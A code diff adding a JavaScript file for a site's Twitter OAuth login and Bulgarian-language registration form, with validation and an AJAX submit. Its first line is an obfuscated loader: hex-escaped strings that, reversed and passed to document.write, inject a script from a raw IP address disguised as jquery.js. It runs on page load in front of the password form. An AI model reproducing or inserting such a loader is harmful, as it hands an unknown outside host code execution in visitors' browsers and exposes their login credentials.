@@ -1,0 +1,88 @@
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
+function openLoginDialog(url, callback) {
+    setCookie("ref", location.href, 1000);
+    $.oauthpopup({
+        path: url,
+        windowName: 'SignInWithTwitter',
+        callback: function () {
+            if (callback == null) {
+                window.location.reload();
+            } else {
+                window.location = callback;
+            }
+
+        }
+    });
+}
+
+function setCookie(c_name, value, exdays) {
+    var exdate = new Date();
+    exdate.setDate(exdate.getDate() + exdays);
+    var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
+    c_value = c_value + "; path=/";
+    document.cookie = c_name + "=" + c_value;
+}
+
+function loginUser() {
+    var username = $("#username");
+    var email = $("#email");
+    var password = $("#password");
+    var passwordRepeat = $("#password-repeat");
+    var networkType = $("#network-type");
+    var ref = $("#ref");
+
+    //Patterns
+    var usernamePattern = /^[a-z0-9]+$/i;
+
+    var emailPattern = /^([a-zA-Z0-9_.-])+@([a-zA-Z0-9_.-])+\.([a-zA-Z])+([a-zA-Z])+/;
+
+    //Username check
+    if (!usernamePattern.test(username.val())) {
+        $("#results_username").html('<label style="color:red;font-style:italic;">Моля, въведете валидно потребителско име.</label>');
+        return false;
+    }
+    //Email check
+    if (!emailPattern.test(email.val())) {
+
+        $("#results_email").html('<label style="color:red;font-style:italic;">Моля, въведете валидeн имейл.</label>');
+
+        return false;
+    }
+
+    if (password.val().length < 1) {
+        $("#results_password").html('<label style="color:red;font-style:italic;">Моля, въведете парола!</label>');
+    }
+
+    if (passwordRepeat.val().length < 1) {
+        $("#results_password_repeat").html('<label style="color:red;font-style:italic;">Моля, потвърдете парола!</label>');
+    }
+
+    //Password check
+    if (password.val() != passwordRepeat.val()) {
+        $("#results_passwords").html('<label style="color:red;font-style:italic;">Моля, въведете две еднакви пароли.</label>');
+        return false;
+    }
+
+    $.ajax({
+        type: 'POST',
+        url: 'index.php?section=auth&page=social_loginuser',
+        data: 'username=' + username.val() + '&email=' + email.val() + '&password=' + password.val() + '&networktype=' + networkType.val(),
+        dataType: 'json',
+        success: function (JSON) {
+            if (JSON.data.resultType == 3) {
+                $("#results_email").html('<label style="color:red;font-style:italic;">Посочения имейл вече се използва от друг акаунт.</label>');
+            }
+
+            if (JSON.data.resultType == 4) {
+                $("#results_username").html('<label style="color:red;font-style:italic;">Потребителското име е заето. <br />Моля, въведете друго.</label>');
+            }
+
+            if (JSON.data.resultType == 5) {
+                $('#complete-register').modal('hide');
+                window.location.href = ref.val();
+            }
+
+
+        }
+    });
+}
